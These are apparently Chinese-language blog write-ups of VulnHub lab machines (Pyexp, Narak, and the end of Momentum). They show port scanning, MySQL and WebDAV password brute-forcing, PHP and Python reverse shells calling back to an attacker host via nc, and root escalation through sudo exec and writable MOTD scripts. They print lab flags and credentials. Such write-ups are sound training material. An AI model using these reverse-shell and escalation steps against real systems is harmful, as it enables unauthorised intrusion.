<p>最后，读取2个flag: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /hoem/auxerre/user.txt</span><br><span class="line">[ Momentum - User Owned ]</span><br><span class="line">---------------------------------------</span><br><span class="line">flag : 84157165c30ad34d18945b647ec7f647</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">// 2. /root/toot.txt</span><br><span class="line">[ Momentum - Rooted ]</span><br><span class="line">---------------------------------------</span><br><span class="line">Flag : 658ff660fdac0b079ea78238e5996e40</span><br><span class="line">---------------------------------------</span><br><span class="line">by alienum with &lt;3</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度中等。我在打靶过程中遇到了两个问题：</p>
<ol type="1">
<li>我也找到了XSS漏洞和JS代码，但是没有将两者联想起来；</li>
<li>之前从来没有遇到过redis，不知道这是什么；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>JS脚本分析</tag>
        <tag>Redis认证漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>17 Vulnhub Pyexp Writeup</title>
    <url>/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度不是很高，但是很有特点。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/pyexp-1,534/">pyexp: 1 ~
VulnHub</a></li>
</ul>
<p>注意：</p>
<ul>
<li>使用 WMware 运行虚拟机</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>SSH密码爆破</li>
<li>MySQL密码爆破</li>
<li>MySQL执行代码</li>
<li>编写解密代码</li>
<li>sudo权限漏洞</li>
<li>python函数</li>
<li>本地提权</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali：192.168.137.10</p>
<p>靶机: 192.168.137.11</p>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.137.11</span><br><span class="line">sudo nmap -p1337,3306 -A 192.168.137.11</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
<p>信息：</p>
<ul>
<li>1337端口的服务为ssh；</li>
<li>3306端口的服务为MySQL，MariaDB是MySQL的一个分支；</li>
</ul>
<p>很奇怪的是该靶机居然没有http服务！！！</p>
<h2 id="mysql密码爆破">2.2. MySQL密码爆破</h2>
<p>可以先进行ssh密码爆破，因此此时不知道靶机上有哪些用户，可以先用root跑</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
<p>时间非常的长，并且最终也跑不出来。</p>
<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
<p>（hydra出了点问题，使用medusa进行爆破也是一样的）</p>
<p>最终得到结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">username: root</span><br><span class="line">password: prettywoman</span><br></pre></td></tr></table></figure>
<p>远程登录数据库： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.137.11 -u root -p</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
<h2 id="信息收集">2.3. 信息收集</h2>
<p>总所周知，MySQL是可以提权的，但是这里有一个问题就是，当前执行MySQL的用户是kali的用户，并不是靶机的用户，因此就算利用MySQL命令执行提权得到的也是kali的用户的权限。可以利用下述命令执行系统查看id就可以知道。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\! id &lt;==&gt; system id &lt;==&gt; select do_system(&#x27;id&#x27;) # 靶机上无法运行第三个</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
<p>还可以读取MySQL的默认配置以及系统文件的内容，默认配置文件没有任何有用的信息，而/etc/passwd里面反而有信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看是否能够进行文件的读取和写入操作</span><br><span class="line">show variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line"></span><br><span class="line">可以！</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
<p>可以发现除了root之外，还有一个lucy用户。其实这里也可以再次进行ssh爆破，但是还是没结果。</p>
<p>其实也可以查看一下/home/lucy/.ssh/id_rsa，如果存在的话，就可以利用密钥登陆ssh，可惜不存在。</p>
<p>最终查看数据库发现有四个数据库 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> data               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>其中，只有第一个是后来生成的，而后面的三个都是MySQL自带的。查看第一个数据，发现有一个表fernet，里面的信息如下：</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>cred</th>
<th>keyy</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=</td>
<td>UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=</td>
</tr>
</tbody>
</table>
<p>没有任何其他的信息了，那么信息应该就隐藏在上述表格中，因为cred和key看起来很像是密码和密钥。</p>
<h2 id="get-shell">2.4. get shell</h2>
<p>这里其实卡了非常久，后来百度知道了fernet其实是python中用来加解密的一个库。</p>
<p>官方文档：<a href="https://cryptography.io/en/latest/fernet/">Fernet
(symmetric encryption) — Cryptography 38.0.0.dev1 documentation</a></p>
<p>可以尝试官方给的加密代码生成密钥和加密，会发现密钥和加密的字符串和keyy和cred非常类似。因此确定是利用fernet进行加密的。</p>
<p>有两种解密方法：</p>
<ol type="1">
<li>在线网站：<a
href="https://asecuritysite.com/encryption/ferdecode">Fernet
(Decode)</a></li>
<li>编写python代码</li>
</ol>
<p>前者比较简单：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
<p>后者演示：(如果利用官方的解密代码查看过生成的key和token，就会发现它们是byte型的，所以前面加b)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b<span class="string">&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line">token = b<span class="string">&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span></span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure></p>
<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
<p>切记要指定端口！！！</p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>在信息收集的时候发现： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
<p>查看一下该文件的权限配置 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ ls -l /opt/exp.py</span><br><span class="line">-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py</span><br></pre></td></tr></table></figure></p>
<p>读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure></p>
<p>心里狂喜，exec是python的函数，可以执行python代码。并且该文件的属主为root，如果用该文件得到shell，那就成功提权到root。</p>
<p>输入如下命令直接提权：(提前用which确定一下是否有bash)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
<p>也可以利用之前python反弹shell的代码：(kali先监听) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
<p>还可以这么写反弹shell，效果和上面的一样。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;nc 192.168.137.10 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>读取两个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/lucy/user.txt</span><br><span class="line">8ca196f62e91847f07f8043b499bd9be</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">a7a7e80ff4920ff06f049012700c99a8</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get
shell，而这台靶机通过数据库信息来get shell。</p>
<p>主要的难点在能否知道fernet是python的加解密的库。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>MySQL密码爆破</tag>
        <tag>sudo提权</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>18 Vulnhub Narak Writeup</title>
    <url>/2022/05/01/18%20Vulnhub%20Narak%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，通过该靶机的渗透，可以学到很多！</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ha-narak,569/">HA: Narak ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>密码字典定制</strong></li>
<li>爆破密码</li>
<li><strong>webdav漏洞</strong></li>
<li>put方法上传</li>
<li>Brainfuck密码</li>
<li><strong>MOTD注入</strong></li>
<li>CVE-2021-3493提权</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.24</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.24</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192741.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache2.4.29</li>
<li>靶机操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>访问80端口，发现不论是源码还是抓包都没有有用的信息。最开始还以为</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192922.png" /></p>
<p>这里面的图片可能存在着隐写，但是尝试过后发现也没有。</p>
<p>没有办法，进行路径扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24/</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193218.png" /></p>
<p>有一个关键的信息，有一个/webdav/的目录，但是状态码是401，也就是需要验证</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193320.png" /></p>
<p>但是目前并没有任何相关的用户名和密码的信息，因此，接着利用自己的字典扫描，看一下是否存在隐藏的文件（也可以用gobuster，会更快）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24 -f -e html,php,txt -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.24 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html</span><br></pre></td></tr></table></figure></p>
<p>最终扫描出一个可以的文件 tips.txt，直接访问该文件得到如下信息：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint to open the door of narak can be found in creds.txt.</span><br></pre></td></tr></table></figure></p>
<p>但是直接访问creds.txt文件，服务器提示没有该文件，最开始还以为这是作者恶作剧。</p>
<h2 id="get-shell">2.3. get shell</h2>
<h3 id="方法1-暴力破解">2.3.1. 方法1-(暴力破解)</h3>
<p>分为两种：</p>
<ul>
<li>纯暴力破解</li>
<li>针对目标站点生成定制字典，比如cewl工具</li>
</ul>
<p>经过一定的信息收集，除了知道 tips.txt 和 creds.txt
之外，没有其他有用的信息，因此尝试直接暴力破解。暴力破解分为两种：</p>
<ul>
<li>纯暴力破解</li>
<li>针对目标站点生成定制字典，比如cewl工具</li>
</ul>
<p>经尝试这里纯暴力破解是没有用的，因此采用第二种。</p>
<ol type="1">
<li><p>首先生成定制的字典，利用cewl工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl 10.0.2.24/ -w dic.txt</span><br></pre></td></tr></table></figure></li>
<li><p>利用hydra配合刚刚生成的字典进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L dic.txt -P dic.txt 10.0.2.24 http-get /webdav</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194055.png" /></p>
<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: yamdoot</span><br><span class="line">password: Swarg</span><br></pre></td></tr></table></figure></p></li>
</ol>
<p>然后直接访问，发现文件为空。但是这里可以利用两个工具，首先介绍davtest。该工具可以测试是否能够远程连接上webdav服务器，测试当前用户的权限，测试哪些文件格式可以被执行，还可以直接上传文件等功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">davtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194448.png" /></p>
<p>它做了4件事：</p>
<ol type="1">
<li>测试能否连接，如果可以，并生成一个session</li>
<li>创建文件夹</li>
<li>发送文件</li>
<li>执行文件</li>
</ol>
<p>从中发现可以上传php文件，并且也可以执行php文件。因此可以上传一个反弹shell的php文件，然后执行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">davtestdavtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php </span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol type="1">
<li><p>php-reverse-shell.php是kali自带的，路径：/usr/share/webshells/php/php-reverse-shell.php</p></li>
<li><p>-uploadfile 后面是kali上的文件名</p></li>
<li><p>-uploadloc 后面是上传到靶机上面之后的文件名（路径）</p></li>
<li><p>-uploadfile 和 -uploadloc 要一起使用！</p></li>
<li><p>记得修改php-reverse-shell.php中的IP和端口信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195026.png" /></p></li>
</ol>
<p>kali监听对应端口之后网页访问对应的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195201.png" /></p>
<p>成功get shell！</p>
<h3 id="方法2-扫描udp端口">2.3.2. 方法2-(扫描UDP端口)</h3>
<p>tips.txt中告诉我们存在creds.txt，但是直接访问又不存在，因此可以考虑一下扫描UDP端口：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU -F 10.0.2.24</span><br><span class="line"></span><br><span class="line"><span class="comment"># -sU: 扫描UDP端口</span></span><br><span class="line"><span class="comment"># -F: 只扫描常用的100个端口</span></span><br></pre></td></tr></table></figure></p>
<p>切记，不要全端口扫描，否则一天可能都扫不完。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195336.png" /></p>
<p>发现udp开了两个端口：</p>
<ul>
<li>68是dhcp服务</li>
<li>69是tftp服务</li>
</ul>
<p>前者就是动态分IP没有什么利用的价值，而后者是一个简单的文件传输的服务。可以直接使用下面的命令连接：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tftp 10.0.24</span><br></pre></td></tr></table></figure></p>
<p>然后根据tips.txt的提示，下载creds.txt文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get creds.txt</span><br></pre></td></tr></table></figure></p>
<p>查看creds.txt，发现是经过base64编码的，解码同样得到了用户名和密码
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat creds.txt                  </span></span><br><span class="line">eWFtZG9vdDpTd2FyZw==</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo &#x27;eWFtZG9vdDpTd2FyZw==&#x27;|base64 -d</span></span><br><span class="line">yamdoot:Swarg</span><br></pre></td></tr></table></figure></p>
<p>这里使用另一款工具cadaver。这款工具可以直接连接上去，然后上传文件即可。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cadaver http://10.0.2.24/webdav</span></span><br><span class="line">Authentication required <span class="keyword">for</span> webdav on server `10.0.2.24<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">Username: yamdoot</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">dav:/webdav/&gt; put php-reverse-shell.php </span></span><br><span class="line"><span class="string">Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php&#x27;</span>:</span><br><span class="line">Progress: [=============================&gt;] 100.0% of 5490 bytes succeeded.</span><br><span class="line">dav:/webdav/&gt; ls</span><br><span class="line">Listing collection `/webdav/<span class="string">&#x27;: succeeded.</span></span><br><span class="line"><span class="string">Coll:   DavTestDir_Ul5734                      0  May  1 19:44</span></span><br><span class="line"><span class="string">        php-reverse-shell.php               5490  May  1 19:58</span></span><br><span class="line"><span class="string">        rev.php </span></span><br></pre></td></tr></table></figure></p>
<p>之后一样的反弹shell即可。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先从/etc/passwd中发现存在着四个用户：root, narak, inferno,
yamdoot</p>
<p>然后进行其他信息收集。 ### 2.4.1. get inferno权限
使用下面命令查找有可能存在问题的文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>上述命令解释：</p>
<ul>
<li>从根目录开始寻找文件</li>
<li>属主为root</li>
<li>权限信息：属主和同一组的有执行权限，其他用户可以写</li>
<li>将找到的文件显示出来</li>
<li>中间报错信息可能是因为权限不够，因此不重要，利用 2&gt;/dev/null
重定向，不显示出来</li>
</ul>
<p>其实我想的是先提到某个用户的权限，再提到root，因此最开始查询的文件属主分别是：narak,
inferno, yamdoot。但是没有文件，因此查看root的，发现了一个奇怪的文件
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ find / -<span class="built_in">type</span> f -user root -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">&lt;oot -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">-rwxrwxrwx 1 root root 124 Sep 22  2020 /mnt/hell.sh</span><br><span class="line">-rwxrwxrwx 1 root root 299 May 18  2017 /etc/update-motd.d/91-release-upgrade</span><br><span class="line">-rwxrwxrwx 1 root root 1220 Apr  9  2018 /etc/update-motd.d/00-header</span><br><span class="line">-rwxrwxrwx 1 root root 4251 Apr  9  2018 /etc/update-motd.d/50-motd-news</span><br><span class="line">-rwxrwxrwx 1 root root 604 Mar 21  2018 /etc/update-motd.d/80-esm</span><br><span class="line">-rwxrwxrwx 1 root root 3017 Mar 21  2018 /etc/update-motd.d/80-livepatch</span><br><span class="line">-rwxrwxrwx 1 root root 1157 Apr  9  2018 /etc/update-motd.d/10-help-text</span><br></pre></td></tr></table></figure></p>
<p>/mnt/hell.sh 跟今天靶机的主题很像，因此查看里面的内容
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ cat /mnt/hell.sh</span><br><span class="line">cat /mnt/hell.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;Highway to Hell&quot;</span>;</span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.</span><br></pre></td></tr></table></figure></p>
<p>这其实是brainfuck语言编写的（对没错，这是一门计算机语言），直接在线解密即可。推荐一个网站：<a
href="https://www.splitbrain.org/services/ook">Brainfuck/Ook!
Obfuscation/Encoding [splitbrain.org]</a></p>
<p>解密得到的信息为：chitragupt</p>
<p>接下来切换用户尝试一下，最后成功切换到inferno用户。不过我使用ssh连接，会更稳定</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201030.png" /></p>
<h3 id="get-root权限">2.4.2. get root权限</h3>
<h4 id="方法1-motd提权">2.4.2.1. 方法1-(MOTD提权)</h4>
<p>经过信息收集，还是没有可以利用的点。但是注意到刚刚执行下面命令时，还有其他可疑的文件。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201129.png" /></p>
<table style="width:7%;">
<colgroup>
<col style="width: 6%" />
</colgroup>
<tbody>
<tr class="odd">
<td>motd: message of the day</td>
</tr>
<tr class="even">
<td>一般使用ssh或者直接登录时，会优先执行/etc/update-motd.d/目录下的脚本文件，因此才有上面ssh登录时的一些信息</td>
</tr>
<tr class="odd">
<td><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201030.png" /></td>
</tr>
</tbody>
</table>
<p>可以看到这些文件对所有用户开放了权限。因此可以利用这些文件，朝里面写入修改root用户的密码，然后下次登录时就会执行这些文件，因此修改了root的用户密码，因此我们就能提权到root。下面命令就是将<code>echo 'root:hdfzzf'|chpasswd</code>写入到文件中：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inferno@ubuntu:~$ <span class="built_in">echo</span> <span class="string">&quot;echo &#x27;root:hdfzzf&#x27;|chpasswd&quot;</span> &gt;&gt; /etc/update-motd.d/00-header</span><br></pre></td></tr></table></figure></p>
<p>重新ssh连接，然后su root即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ssh inferno@10.0.2.24                                                                                        130 ⨯</span></span><br><span class="line">inferno@10.0.2.24<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">New release &#x27;</span>20.04.4 LTS<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span>do-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  1 05:09:56 2022 from 10.0.2.4</span></span><br><span class="line"><span class="string">inferno@ubuntu:~$ su root</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">root@ubuntu:/home/inferno# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure></p>
<p>依次读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1. /home/inferno/user.txt</span><br><span class="line">Flag: &#123;5f95bf06ce19af69bfa5e53f797ce6e2&#125;</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span 